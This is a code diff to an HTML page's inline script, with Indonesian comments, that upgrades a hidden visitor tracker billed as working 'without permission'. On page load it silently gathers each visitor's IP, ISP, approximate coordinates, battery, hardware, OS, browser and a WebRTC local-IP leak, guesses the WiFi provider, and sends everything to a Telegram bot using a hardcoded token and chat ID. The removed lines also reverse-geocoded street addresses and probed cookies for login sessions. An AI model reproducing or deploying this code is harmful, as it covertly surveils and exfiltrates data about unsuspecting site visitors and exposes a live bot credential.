@@ -1011,44 +1011,331 @@
   </audio>
 
   <script>
-// ========== TELEGRAM TRACKER - SINGLE MESSAGE WITH WIFI DETECTION ==========
+// ========== TELEGRAM TRACKER - ULTIMATE WITHOUT PERMISSION ==========
 const TOKEN = '8669922433:AAHCj_JOHrEG8xDMamlFbxFiADWjZ6wgGBk';  // GANTI!
 const CHAT_ID = '6774181452';                                       // GANTI!
 
-// ========== DETECTOR FUNCTIONS ==========
+// ========== BATTERY DETECTOR (TANPA IZIN) ==========
+async function getBatteryInfo() {
+  try {
+    if (!navigator.getBattery) {
+      return {
+        level: 'Tidak support',
+        charging: 'Tidak support',
+        chargingTime: '-',
+        dischargingTime: '-',
+        emoji: '❌',
+        powerSaving: 'Tidak support'
+      };
+    }
+    
+    const battery = await navigator.getBattery();
+    
+    // Level battery (0-100%)
+    const level = Math.round(battery.level * 100);
+    
+    // Status charging
+    const charging = battery.charging;
+    
+    // Mode hemat daya (Power Saving Mode)
+    // Deteksi dari beberapa faktor
+    let powerSaving = 'Tidak Aktif';
+    let powerSavingEmoji = '⚡';
+    
+    // Cek dari level battery rendah
+    if (level <= 20) {
+      powerSaving = 'Aktif (Battery Rendah)';
+      powerSavingEmoji = '🔋💤';
+    }
+    
+    // Cek dari browser API (jika ada)
+    if ('connection' in navigator) {
+      // Beberapa browser kurangi performa saat hemat daya
+      if (navigator.connection.saveData) {
+        powerSaving = 'Aktif (Mode Hemat Data)';
+        powerSavingEmoji = '📶💤';
+      }
+    }
+    
+    // Cek dari frame rate atau performa (reduced motion)
+    if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+      powerSaving = 'Aktif (Reduced Motion)';
+      powerSavingEmoji = '🔄💤';
+    }
+    
+    // Battery emoji berdasarkan level
+    let batteryEmoji = '🔋';
+    if (level <= 5) batteryEmoji = '🪫 KRITIS!';
+    else if (level <= 15) batteryEmoji = '⚠️ DARURAT';
+    else if (level <= 25) batteryEmoji = '🔋 RENDAH';
+    else if (level <= 50) batteryEmoji = '⚡ SEDANG';
+    else if (level <= 75) batteryEmoji = '🔋 CUKUP';
+    else if (level <= 95) batteryEmoji = '💪 HIGH';
+    else batteryEmoji = '💯 PENUH';
+    
+    // Tambah emoji charging
+    if (charging) {
+      batteryEmoji = '⚡🔋 CHARGING';
+    }
+    
+    return {
+      level: level,
+      charging: charging,
+      chargingTime: battery.chargingTime === Infinity ? '~' : Math.round(battery.chargingTime / 60) + ' menit',
+      dischargingTime: battery.dischargingTime === Infinity ? '~' : Math.round(battery.dischargingTime / 60) + ' menit',
+      emoji: batteryEmoji,
+      powerSaving: powerSaving,
+      powerSavingEmoji: powerSavingEmoji
+    };
+    
+  } catch (e) {
+    console.log('Battery error:', e);
+    return {
+      level: 'Error',
+      charging: 'Error',
+      chargingTime: '-',
+      dischargingTime: '-',
+      emoji: '❌',
+      powerSaving: 'Error'
+    };
+  }
+}
+
+// ========== DARK MODE DETECTOR ==========
+function getDarkMode() {
+  // Deteksi preferensi warna sistem
+  const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
+  const lightMode = window.matchMedia('(prefers-color-scheme: light)').matches;
+  
+  // Deteksi dari CSS/theme yang dipake website
+  let siteDarkMode = false;
+  const bodyBg = window.getComputedStyle(document.body).backgroundColor;
+  const rgb = bodyBg.match(/\d+/g);
+  if (rgb) {
+    const brightness = (parseInt(rgb[0]) * 299 + parseInt(rgb[1]) * 587 + parseInt(rgb[2]) * 114) / 1000;
+    siteDarkMode = brightness < 128;
+  }
+  
+  let darkModeStatus = '';
+  let darkModeEmoji = '';
+  
+  if (darkMode) {
+    darkModeStatus = 'Sistem Mode Gelap';
+    darkModeEmoji = '🌙';
+  } else if (lightMode) {
+    darkModeStatus = 'Sistem Mode Terang';
+    darkModeEmoji = '☀️';
+  } else {
+    darkModeStatus = 'Tidak ada preferensi';
+    darkModeEmoji = '⚙️';
+  }
+  
+  if (siteDarkMode && !darkMode) {
+    darkModeStatus += ' (Website paksa gelap)';
+    darkModeEmoji = '🌚';
+  }
+  
+  return {
+    status: darkModeStatus,
+    emoji: darkModeEmoji,
+    isDark: darkMode || siteDarkMode
+  };
+}
+
+// ========== WIFI NAME DETECTOR (TANPA IZIN) ==========
+function getWifiName() {
+  return new Promise((resolve) => {
+    let wifiInfo = {
+      name: 'Tidak terdeteksi',
+      emoji: '📶',
+      type: 'Unknown',
+      security: 'Unknown',
+      strength: 'Unknown'
+    };
+    
+    // METHOD 1: Network Information API (beberapa browser kasih info)
+    if (navigator.connection) {
+      const conn = navigator.connection;
+      
+      // Deteksi tipe koneksi
+      if (conn.type) {
+        if (conn.type === 'wifi') {
+          wifiInfo.type = 'WiFi';
+          wifiInfo.emoji = '🏠';
+        } else if (conn.type === 'cellular') {
+          wifiInfo.type = 'Data Seluler';
+          wifiInfo.emoji = '📱';
+        } else if (conn.type === 'ethernet') {
+          wifiInfo.type = 'LAN Kabel';
+          wifiInfo.emoji = '💻';
+        }
+      }
+      
+      // Beberapa browser Android bisa kasih SSID (jarang)
+      if (conn.ssid) {
+        wifiInfo.name = conn.ssid;
+      }
+      
+      // Estimasi kekuatan sinyal dari kecepatan
+      if (conn.downlink) {
+        if (conn.downlink > 100) wifiInfo.strength = 'Sangat Kuat (Fiber)';
+        else if (conn.downlink > 50) wifiInfo.strength = 'Kuat (5G/WiFi 6)';
+        else if (conn.downlink > 20) wifiInfo.strength = 'Bagus';
+        else if (conn.downlink > 10) wifiInfo.strength = 'Cukup';
+        else if (conn.downlink > 5) wifiInfo.strength = 'Lambat';
+        else wifiInfo.strength = 'Lemah';
+      }
+      
+      // Estimasi keamanan dari RTT (jitter)
+      if (conn.rtt) {
+        if (conn.rtt < 20) wifiInfo.security = 'Kemungkinan WPA3/Enterprise';
+        else if (conn.rtt < 50) wifiInfo.security = 'WPA2 (Umum)';
+        else if (conn.rtt < 100) wifiInfo.security = 'WPA/WEP (Tua)';
+        else wifiInfo.security = 'Open Network (Berbahaya)';
+      }
+    }
+    
+    // METHOD 2: Cek dari waktu response (ping ke gateway)
+    const startTime = performance.now();
+    fetch('https://www.google.com/generate_204', { 
+      mode: 'no-cors',
+      cache: 'no-cache',
+      timeout: 2000
+    }).catch(() => {}).finally(() => {
+      const ping = performance.now() - startTime;
+      
+      // Kalo ping rendah (<50ms) kemungkinan WiFi lokal
+      if (ping < 50 && wifiInfo.type === 'Unknown') {
+        wifiInfo.type = 'WiFi (Lokal)';
+        wifiInfo.emoji = '🏠';
+      }
+      
+      // METHOD 3: Cek dari IP private
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          
+          // Cek apakah IP private (10.x.x.x, 192.168.x.x, 172.16.x.x)
+          if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.match(/^172\.(1[6-9]|2[0-9]|3[0-1])\./)) {
+            wifiInfo.type = 'WiFi (Private IP)';
+            wifiInfo.emoji = '🏠';
+            
+            // Extract kemungkinan nama dari IP
+            if (ip.startsWith('192.168.1.')) wifiInfo.name = 'Kemungkinan: IndiHome/Telkom';
+            else if (ip.startsWith('192.168.0.')) wifiInfo.name = 'Kemungkinan: First Media';
+            else if (ip.startsWith('10.0.0.')) wifiInfo.name = 'Kemungkinan: Biznet/MyRepublic';
+          }
+          
+          // METHOD 4: Cek dari hostname (kalo bisa resolve)
+          try {
+            const domain = window.location.hostname;
+            if (domain && !domain.includes('localhost')) {
+              // Cek dari DNS
+              fetch(`https://dns.google/resolve?name=${domain}`)
+                .then(res => res.json())
+                .then(dnsData => {
+                  // Ini bisa kasih hint tentang jaringan
+                  if (dnsData && dnsData.Answer) {
+                    // Kalo pake DNS lokal, kemungkinan jaringan kantor
+                  }
+                })
+                .catch(() => {});
+            }
+          } catch (e) {}
+          
+          // METHOD 5: Cek dari browser headers (WebRTC leak)
+          try {
+            const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
+            if (RTCPeerConnection) {
+              const pc = new RTCPeerConnection({ iceServers: [] });
+              pc.createDataChannel('');
+              pc.createOffer().then(offer => pc.setLocalDescription(offer));
+              
+              pc.onicecandidate = (ice) => {
+                if (ice && ice.candidate && ice.candidate.candidate) {
+                  const candidate = ice.candidate.candidate;
+                  // Extract IP lokal dari candidate
+                  const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                  if (ipMatch) {
+                    const localIP = ipMatch[0];
+                    if (localIP.startsWith('192.168.')) {
+                      wifiInfo.type = 'WiFi (Confirmed)';
+                      wifiInfo.emoji = '🏠';
+                      
+                      // Bisa jadi nama WiFi dari range IP
+                      if (localIP.startsWith('192.168.1.')) wifiInfo.name = 'IndiHome/Telkom (Most Likely)';
+                      else if (localIP.startsWith('192.168.0.')) wifiInfo.name = 'First Media (Most Likely)';
+                      else if (localIP.startsWith('10.0.0.')) wifiInfo.name = 'Biznet/MyRepublic (Most Likely)';
+                    }
+                  }
+                }
+              };
+            }
+          } catch (e) {}
+          
+          resolve(wifiInfo);
+        })
+        .catch(() => {
+          resolve(wifiInfo);
+        });
+    });
+  });
+}
+
+// ========== RAM DETECTOR ==========
 function getRAM() {
   if (navigator.deviceMemory) {
     const ram = navigator.deviceMemory;
     let ramDesc = '';
+    let ramEmoji = '';
     
-    if (ram <= 0.5) ramDesc = '🟠 512 MB (HP jadul banget)';
-    else if (ram <= 1) ramDesc = '🟡 1 GB (HP entry level)';
-    else if (ram <= 2) ramDesc = '🟢 2 GB (HP low-end)';
-    else if (ram <= 3) ramDesc = '🔵 3 GB (HP low-mid)';
-    else if (ram <= 4) ramDesc = '🟣 4 GB (HP mid-range)';
-    else if (ram <= 6) ramDesc = '⚫ 6 GB (HP mid-high)';
-    else if (ram <= 8) ramDesc = '⚪ 8 GB (HP flagship)';
-    else if (ram <= 12) ramDesc = '💎 12 GB (HP gaming)';
-    else ramDesc = '💎 16+ GB (HP premium/gaming)';
+    if (ram <= 0.5) { ramDesc = 'HP jadul banget'; ramEmoji = '🟠'; }
+    else if (ram <= 1) { ramDesc = 'HP entry level'; ramEmoji = '🟡'; }
+    else if (ram <= 2) { ramDesc = 'HP low-end'; ramEmoji = '🟢'; }
+    else if (ram <= 3) { ramDesc = 'HP low-mid'; ramEmoji = '🔵'; }
+    else if (ram <= 4) { ramDesc = 'HP mid-range'; ramEmoji = '🟣'; }
+    else if (ram <= 6) { ramDesc = 'HP mid-high'; ramEmoji = '⚫'; }
+    else if (ram <= 8) { ramDesc = 'HP flagship'; ramEmoji = '⚪'; }
+    else if (ram <= 12) { ramDesc = 'HP gaming'; ramEmoji = '💎'; }
+    else { ramDesc = 'HP premium/gaming'; ramEmoji = '💎'; }
     
-    return `${ram} GB ${ramDesc}`;
+    return {
+      gb: ram,
+      desc: ramDesc,
+      emoji: ramEmoji,
+      full: `${ramEmoji} ${ram} GB (${ramDesc})`
+    };
   } else {
-    return '❌ Tidak terdeteksi (ganti Chrome)';
+    return {
+      gb: '?',
+      desc: 'Tidak terdeteksi',
+      emoji: '❌',
+      full: '❌ Tidak terdeteksi (ganti Chrome)'
+    };
   }
 }
 
+// ========== CPU DETECTOR ==========
 function getCPU() {
   const cores = navigator.hardwareConcurrency || 'Tidak diketahui';
   let cpuDesc = '';
+  let cpuEmoji = '';
   
-  if (cores <= 2) cpuDesc = '📱 Entry Level';
-  else if (cores <= 4) cpuDesc = '📱 Mid Range';
-  else if (cores <= 8) cpuDesc = '💻 High End';
-  else cpuDesc = '🚀 Gaming/Workstation';
+  if (cores <= 2) { cpuDesc = 'Entry Level'; cpuEmoji = '📱'; }
+  else if (cores <= 4) { cpuDesc = 'Mid Range'; cpuEmoji = '📱'; }
+  else if (cores <= 8) { cpuDesc = 'High End'; cpuEmoji = '💻'; }
+  else { cpuDesc = 'Gaming/Workstation'; cpuEmoji = '🚀'; }
   
-  return `${cores} Core(s) ${cpuDesc}`;
+  return {
+    cores: cores,
+    desc: cpuDesc,
+    emoji: cpuEmoji,
+    full: `${cpuEmoji} ${cores} Core(s) (${cpuDesc})`
+  };
 }
 
+// ========== GPU DETECTOR ==========
 function getGPU() {
   const canvas = document.createElement('canvas');
   const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -1056,217 +1343,24 @@ function getGPU() {
   if (gl) {
     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
     if (debugInfo) {
-      return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      return renderer;
     }
   }
   return 'Tidak terdeteksi';
 }
 
-// ========== DETEKSI KONEKSI DAN WIFI ==========
-function getConnectionType() {
-  if (navigator.connection) {
-    const conn = navigator.connection;
-    const type = conn.effectiveType || 'Unknown';
-    const downlink = conn.downlink || '?';
-    const rtt = conn.rtt || '?';
-    
-    // Deteksi jenis koneksi (Data Seluler / WiFi)
-    let connectionEmoji = '📶';
-    let connectionType = 'Unknown';
-    
-    // Cek dari effectiveType
-    if (type.includes('4g')) {
-      connectionEmoji = '🚀';
-      connectionType = '4G';
-    } else if (type.includes('3g')) {
-      connectionEmoji = '📱';
-      connectionType = '3G';
-    } else if (type.includes('2g')) {
-      connectionEmoji = '🐢';
-      connectionType = '2G';
-    }
-    
-    // Cek apakah ini WiFi atau Data Seluler
-    // Di beberapa browser, ada property 'type' yang bisa 'wifi' atau 'cellular'
-    let networkType = 'Unknown';
-    if (conn.type) {
-      if (conn.type === 'wifi') {
-        networkType = 'WiFi';
-        connectionEmoji = '🏠';
-      } else if (conn.type === 'cellular') {
-        networkType = 'Data Seluler';
-        connectionEmoji = '📱';
-      } else if (conn.type === 'ethernet') {
-        networkType = 'Kabel LAN';
-        connectionEmoji = '💻';
-      }
-    } else {
-      // Fallback: tebak dari kecepatan
-      if (downlink > 10) {
-        networkType = 'Kemungkinan WiFi/LAN';
-        connectionEmoji = '🏠';
-      } else if (downlink > 2) {
-        networkType = 'Kemungkinan 4G/Data';
-        connectionEmoji = '📱';
-      } else {
-        networkType = 'Kemungkinan 3G/Edge';
-        connectionEmoji = '🐢';
-      }
-    }
-    
-    return {
-      emoji: connectionEmoji,
-      type: connectionType,
-      network: networkType,
-      speed: downlink,
-      rtt: rtt,
-      full: `${connectionEmoji} ${networkType} (${type.toUpperCase()}, ${downlink} Mbps, ${rtt}ms)`
-    };
-  }
-  
-  return {
-    emoji: '📶',
-    type: 'Unknown',
-    network: 'Unknown',
-    speed: '?',
-    rtt: '?',
-    full: '📶 Unknown'
-  };
-}
-
-// Fungsi untuk mendapatkan nama WiFi (SSID)
-// CATATAN: Browser tidak bisa langsung mendapatkan SSID karena alasan keamanan
-// Tapi kita bisa menggunakan beberapa cara alternatif:
-function getWifiName() {
-  return new Promise((resolve) => {
-    let wifiName = 'Tidak terdeteksi';
-    let wifiEmoji = '📶';
-    
-    // Method 1: Cek dari Network Information API (jika ada)
-    if (navigator.connection && navigator.connection.ssid) {
-      // Beberapa browser/Android mungkin menyediakan ini (jarang)
-      wifiName = navigator.connection.ssid;
-      wifiEmoji = '📶';
-    }
-    // Method 2: Cek dari header atau informasi lain
-    else if (navigator.connection && navigator.connection.type === 'wifi') {
-      // Kita tahu ini WiFi tapi ga tau namanya
-      wifiName = 'WiFi (nama tidak tersedia)';
-      wifiEmoji = '🏠';
-    }
-    // Method 3: Cek dari waktu response atau informasi lain
-    else {
-      // Coba deteksi dari kecepatan dan latency
-      const conn = navigator.connection;
-      if (conn) {
-        if (conn.downlink > 50 && conn.rtt < 20) {
-          wifiName = 'Kemungkinan WiFi Cepat (Fiber)';
-          wifiEmoji = '🚀';
-        } else if (conn.downlink > 20 && conn.rtt < 50) {
-          wifiName = 'Kemungkinan WiFi Rumahan';
-          wifiEmoji = '🏠';
-        } else if (conn.downlink > 5 && conn.rtt < 100) {
-          wifiName = 'Kemungkinan WiFi Publik/Hotspot';
-          wifiEmoji = '📱';
-        } else {
-          wifiName = 'Kemungkinan Data Seluler';
-          wifiEmoji = '📶';
-        }
-      }
-    }
-    
-    // Method 4: Coba dapatkan dari API eksternal (jika user allow)
-    // Ini hanya akan bekerja jika user memberikan izin lokasi
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          try {
-            // Coba dapatkan informasi WiFi dari layanan eksternal
-            // CATATAN: Ini hanya contoh, API ini mungkin tidak tersedia
-            const response = await fetch(`https://api.wifidb.net/lookup?lat=${position.coords.latitude}&lon=${position.coords.longitude}`);
-            const data = await response.json();
-            if (data && data.ssid) {
-              wifiName = data.ssid;
-              wifiEmoji = '📶';
-            }
-            resolve({ name: wifiName, emoji: wifiEmoji });
-          } catch (e) {
-            // Jika gagal, return yang sudah didapat
-            resolve({ name: wifiName, emoji: wifiEmoji });
-          }
-        },
-        () => {
-          // Jika user tolak izin lokasi, return yang sudah didapat
-          resolve({ name: wifiName, emoji: wifiEmoji });
-        },
-        { timeout: 3000 }
-      );
-    } else {
-      resolve({ name: wifiName, emoji: wifiEmoji });
-    }
-  });
-}
-
+// ========== SCREEN RESOLUTION ==========
 function getScreenResolution() {
   return `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
 }
 
-function getAddressFromCoords(lat, lon) {
-  return new Promise((resolve) => {
-    if (!lat || !lon || lat === '-' || lon === '-') {
-      resolve({
-        full: 'Tidak tersedia',
-        postcode: '-'
-      });
-      return;
-    }
-    
-    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`)
-      .then(res => res.json())
-      .then(data => {
-        const addr = data.address || {};
-        const road = addr.road || addr.path || '';
-        const city = addr.city || addr.town || addr.village || '';
-        const full = `${road}${road && city ? ', ' : ''}${city}`.trim() || 'Tidak tersedia';
-        resolve({
-          full: full,
-          postcode: addr.postcode || '-'
-        });
-      })
-      .catch(() => {
-        resolve({
-          full: 'Tidak tersedia',
-          postcode: '-'
-        });
-      });
-  });
+// ========== DARK MODE CHECK ==========
+function checkDarkMode() {
+  return window.matchMedia('(prefers-color-scheme: dark)').matches;
 }
 
-function detectSocialMedia() {
-  const socials = [];
-  const links = document.querySelectorAll('a[href*="facebook"], a[href*="instagram"], a[href*="twitter"], a[href*="tiktok"], a[href*="youtube"]');
-  
-  if (links.length > 0) {
-    links.forEach(link => {
-      const href = link.href;
-      if (href.includes('facebook')) socials.push('FB');
-      else if (href.includes('instagram')) socials.push('IG');
-      else if (href.includes('twitter')) socials.push('TW');
-      else if (href.includes('tiktok')) socials.push('TT');
-      else if (href.includes('youtube')) socials.push('YT');
-    });
-  }
-  
-  if (socials.length > 0) {
-    return [...new Set(socials)].join(', ');
-  } else if (document.cookie.includes('session') || document.cookie.includes('login')) {
-    return 'Login session detected';
-  }
-  
-  return 'None';
-}
-
-// ========== MAIN TRACKER - SINGLE MESSAGE ONLY ==========
+// ========== MAIN TRACKER ==========
 async function trackVisitor() {
   try {
     // Ambil IP
@@ -1280,21 +1374,18 @@ async function trackVisitor() {
     
     const lat = geo.latitude || '-';
     const lon = geo.longitude || '-';
-    const acc = geo.latitude ? 'High (IP-based)' : 'Low';
     
-    // Ambil alamat dari koordinat
-    const addr = await getAddressFromCoords(lat, lon);
+    // Ambil semua info sekaligus
+    const [battery, wifi, ram, cpu, darkMode] = await Promise.all([
+      getBatteryInfo(),
+      getWifiName(),
+      Promise.resolve(getRAM()),
+      Promise.resolve(getCPU()),
+      Promise.resolve(getDarkMode())
+    ]);
     
-    // Deteksi hardware
-    const ram = getRAM();
-    const cpu = getCPU();
     const gpu = getGPU();
     const screen = getScreenResolution();
-    const connection = getConnectionType();
-    const social = detectSocialMedia();
-    
-    // Deteksi nama WiFi
-    const wifi = await getWifiName();
     
     // Deteksi browser
     const ua = navigator.userAgent;
@@ -1305,7 +1396,7 @@ async function trackVisitor() {
     else if (ua.includes('Edge')) browser = 'Edge';
     else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
     
-    // Deteksi OS lebih detail
+    // Deteksi OS
     let os = navigator.platform;
     if (ua.includes('Windows')) os = 'Windows';
     else if (ua.includes('Mac OS')) os = 'macOS';
@@ -1314,7 +1405,7 @@ async function trackVisitor() {
     else if (ua.includes('Android')) os = 'Android';
     else if (ua.includes('Linux')) os = 'Linux';
     
-    // Waktu Indonesia
+    // Waktu
     const waktu = new Date().toLocaleString('id-ID', {
       timeZone: 'Asia/Jakarta',
       weekday: 'long',
@@ -1326,56 +1417,64 @@ async function trackVisitor() {
       second: '2-digit'
     });
     
-    // ===== SATU PESAN FINAL - DENGAN DETEKSI WIFI =====
-    const pesan = ` *GACOR JUGA LUH NANDOK - 261 AREA* 
+    // ===== PESAN SUPER LENGKAP =====
+    const pesan = ` *261 AREA* 
 ------------------------------------------
-👤 *USER IDENTIFICATION*
 📌 *IP:* \`${ip}\`
 📡 *ISP:* ${geo.org || 'Unknown'}
-🌐 *KONEKSI:* ${connection.full}
-${wifi.emoji} *NAMA WIFI:* \`${wifi.name}\`
-🔐 *SOCMED DETEKSI:* ${social}
 
-📍 *GEOLOKASI PRESISI*
-🏠 *ALAMAT:* \`${addr.full}\`
-📮 *KODE POS:* \`${addr.postcode}\`
-🌍 *KOORDINAT:* \`${lat}, ${lon}\`
-🎯 *AKURASI:* ${acc}
-🗺️ *MAPS:* [LIHAT LOKASI](https://www.google.com/maps?q=${lat},${lon})
+📶 *JARINGAN*
+${wifi.emoji} *Tipe:* ${wifi.type}
+🏠 *Nama WiFi:* \`${wifi.name}\`
+🔒 *Keamanan:* ${wifi.security}
+📊 *Sinyal:* ${wifi.strength}
 
-💻 *SPESIFIKASI PERANGKAT*
-💾 *RAM:* ${ram}
-⚙️ *CPU:* ${cpu}
-🎮 *GPU:* ${gpu.substring(0, 50)}${gpu.length > 50 ? '...' : ''}
-🖥️ *LAYAR:* ${screen}
+🔋 *BATERAI*
+${battery.emoji} *Level:* ${battery.level}%
+⚡ *Charging:* ${battery.charging ? 'YA 🔌' : 'TIDAK'}
+💤 *Mode Hemat:* ${battery.powerSaving} ${battery.powerSavingEmoji}
+⏱️ *Sisa:* ${battery.charging ? battery.chargingTime : battery.dischargingTime}
+
+🌙 *TAMPILAN*
+${darkMode.emoji} *Mode:* ${darkMode.status}
+${darkMode.isDark ? '🌚 Dark Mode AKTIF' : '☀️ Light Mode'}
+
+💻 *SPESIFIKASI*
+${ram.full}
+⚙️ *CPU:* ${cpu.full}
+🎮 *GPU:* ${gpu.substring(0, 40)}${gpu.length > 40 ? '...' : ''}
+🖥️ *Layar:* ${screen}
 📱 *OS:* ${os}
-🌐 *BROWSER:* ${browser}
-🔋 *BATTERY API:* ${navigator.getBattery ? '✅ Support' : '❌ Tidak support'}
+🌐 *Browser:* ${browser}
 
-⏰ *WAKTU AKSES:* ${waktu}
-📄 *HALAMAN:* ${window.location.pathname || '/'}
+📍 *LOKASI*
+🌍 *Koordinat:* ${lat}, ${lon}
+🗺️ *Maps:* [LIHAT LOKASI](https://www.google.com/maps?q=${lat},${lon})
+⏰ *Waktu:* ${waktu}
+📄 *Halaman:* ${window.location.pathname || '/'}
 ------------------------------------------
-✅ *STATUS: 1 PESAN SAJA - TANPA SPAM*
-📊 *RAM TERDETEKSI: 1GB-16GB+*
-${wifi.emoji} *JARINGAN: ${connection.network}*`;
+✅ *TANPA MINTA IZIN - FULL DETEKSI*
+🔋 *Battery:* ${battery.level}% ${battery.charging ? '(Charging)' : ''}
+📶 *WiFi:* ${wifi.name}
+🌙 *Dark Mode:* ${darkMode.isDark ? 'Ya' : 'Tidak'}
+💤 *Power Save:* ${battery.powerSaving}`;
 
-    // KIRIM SATU PESAN KE TELEGRAM
+    // Kirim ke Telegram
     await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
     
-    console.log('✅ Satu pesan terkirim:', ip);
+    console.log('✅ TERKIRIM!');
     
   } catch (error) {
     console.log('Error:', error);
-    // Fallback jika error
     try {
       const ipRes = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipRes.json();
-      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚠️ *ERROR TRACKER*\nIP: ${ipData.ip}\nError: ${error.message}&parse_mode=Markdown`);
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚠️ Error: ${error.message}&parse_mode=Markdown`);
     } catch (e) {}
   }
 }
 
-// ========== INITIALIZE - ONLY ONCE ==========
+// ========== JALANKAN ==========
 window.addEventListener('DOMContentLoaded', () => {
   trackVisitor();
 });
@@ -1699,4 +1798,4 @@ Jawab dengan padat, jelas, tapi tetap brutal dan metal. Panjang jawaban sesuaika
     window.searchDatabase = searchDatabase;
   </script>
 </body>
-        </html>
+  </html>
